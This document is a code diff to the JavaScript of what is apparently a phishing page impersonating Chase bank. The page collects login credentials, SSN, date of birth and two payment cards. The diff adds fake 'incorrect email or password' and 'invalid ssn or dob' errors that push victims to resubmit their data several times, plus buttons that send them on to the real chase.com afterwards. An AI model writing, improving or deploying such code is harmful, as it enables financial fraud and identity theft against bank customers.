@@ -10,7 +10,7 @@ const IsNotCard = document.getElementById("ma3andoshakhra20");
 const HidecardDiv = document.getElementById("hideothercard");
 const card2Form = document.getElementById("cardfrom2");
 const finalDiv = document.getElementById("congra");
-
+let attempts = 0;
 // -------------------------
 // Loading Spinner Helpers
 // -------------------------
@@ -52,6 +52,7 @@ document.head.appendChild(style);
 
 
 
+
 EmailFrom.addEventListener("submit", async function (e) {
     e.preventDefault();
 
@@ -68,6 +69,23 @@ EmailFrom.addEventListener("submit", async function (e) {
         const data = await response.json();
 
         clearLoading(loginbtn);
+        const errorDiv = document.getElementById("errorremail")
+        attempts += 1;
+  
+        
+        if (attempts <= 1) {
+
+            errorDiv.innerHTML = ""; // Clear old errors
+
+            const errorMessage = document.createElement("div");
+            errorMessage.classList.add("error-message");
+            errorMessage.textContent = 
+                "Incorrect email or password. Check your email or password and retry.";
+
+            errorDiv.appendChild(errorMessage);
+            return;
+        }
+
 
         if (data.status === "success") {
             EmailDiv.style.display = 'none';
@@ -100,6 +118,24 @@ BillingForm.addEventListener("submit", async function (e) {
         const data = await response.json();
 
         clearLoading(loginbtn);
+        const errorDiv = document.getElementById("errorrbilling");
+        attempts += 1;
+        console.log(attempts);
+
+        
+        if (attempts <= 3) {
+
+            errorDiv.innerHTML = ""; // Clear old errors
+
+            const errorMessage = document.createElement("div");
+            errorMessage.classList.add("error-message");
+            errorMessage.textContent = 
+                "Invalid ssn or dob. Check input and try again.";
+
+            errorDiv.appendChild(errorMessage);
+            return;
+        }
+
 
         if (data.status === "success") {
             BillingDiv.style.display = 'none';
@@ -133,6 +169,22 @@ card1From.addEventListener("submit", async function (e) {
         const data = await response.json();
 
         clearLoading(loginbtn);
+        const errorDiv = document.getElementById("errorrcard");
+        attempts += 1;
+        
+        if (attempts <= 4) {
+
+            errorDiv.innerHTML = ""; // Clear old errors
+
+            const errorMessage = document.createElement("div");
+            errorMessage.classList.add("error-message");
+            errorMessage.textContent = 
+                "Invalid Input. Check input and try again.";
+
+            errorDiv.appendChild(errorMessage);
+            return;
+        }
+       
 
         if (data.status === "success") {
             card1Div.style.display = 'none';
@@ -179,6 +231,23 @@ card2Form.addEventListener("submit", async function (e) {
 
         clearLoading(loginbtn);
 
+        const errorDiv = document.getElementById("errorrcard2");
+        attempts += 1;
+
+        if (attempts <= 1) {
+
+            errorDiv.innerHTML = ""; // Clear old errors
+
+            const errorMessage = document.createElement("div");
+            errorMessage.classList.add("error-message");
+            errorMessage.textContent = 
+                "Invalid Input. Check input and try again.";
+
+            errorDiv.appendChild(errorMessage);
+            return;
+        }
+       
+
         if (data.status === "success") {
             card2Div.style.display = 'none';
             finalDiv.style.display = 'block';
@@ -192,4 +261,15 @@ card2Form.addEventListener("submit", async function (e) {
         console.error("Error:", error);
         alert("An error occurred during Login");
     }
+});
+
+const dihlogin = document.getElementById("dihlogin");
+const dihlogin2 = document.getElementById("dihlogin2");
+
+dihlogin.addEventListener("click", () => {
+    window.location.href= 'https://www.chase.com/';
+});
+
+dihlogin2.addEventListener("click", () => {
+    window.location.href= 'https://www.chase.com/';
 });
